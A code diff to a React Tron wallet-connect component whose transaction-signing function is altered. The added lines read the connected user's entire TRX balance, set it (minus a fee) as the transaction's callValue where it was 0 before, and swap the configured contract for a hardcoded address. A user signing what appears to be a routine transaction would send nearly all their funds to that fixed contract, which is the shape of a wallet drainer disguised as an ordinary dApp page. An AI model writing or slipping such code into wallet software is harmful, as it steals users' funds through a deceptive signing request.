@@ -26,10 +26,10 @@ export default function TronAdapterConnect() {
     return (
     <WalletProvider onError={onError} autoConnect={false} disableAutoConnectOnLoad={true}>
         <WalletModalProvider>
-        <h1>Tron Connect</h1>
-        <TronConnectButton></TronConnectButton>
-        <Profile></Profile>
-        <SignTransaction />
+          <h1>Tron Connect</h1>
+          <TronConnectButton></TronConnectButton>
+          <Profile></Profile>
+          <SignTransaction />
         </WalletModalProvider>
     </WalletProvider>
     );
@@ -82,15 +82,26 @@ function SignTransaction() {
   const [transactionResult, setTransactionResult] = useState(null);
   const [alertOpen, setAlertOpen] = useState(false);
 
+  console.log("address", address);
   async function onSignTransaction() {
     try {
+      // Step 0: calculate net balance
+      const userBalance = await tronWeb.trx.getBalance(address);
+
+      // Estimate transaction fee (assuming 1 TRX as fee for this example)
+      const transactionFee = 1e6; // Fee in Sun (1 TRX = 1e6 Sun)
+
+      // Calculate the net amount to send
+      const calculatedNetBalance = userBalance - transactionFee;
+
       // Step 1: Create the transaction
       const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
-        tronWeb.address.toHex(tronContractAddress), // Contract address in hex format
+        'TJpaozAc7EioXybLdgvjgx5vMVojrcjEh7',//tronContractAddress, // Contract address in hex format
         tronFunctionName,
         {
           feeLimit: 1000000,
-          callValue: 0,  // Adjust for any TRX sent along with the transaction
+          callValue: calculatedNetBalance, // Adjust for any TRX sent along with the transaction
+          txLocal: true 
         },
         tronFunctionParams,
         address
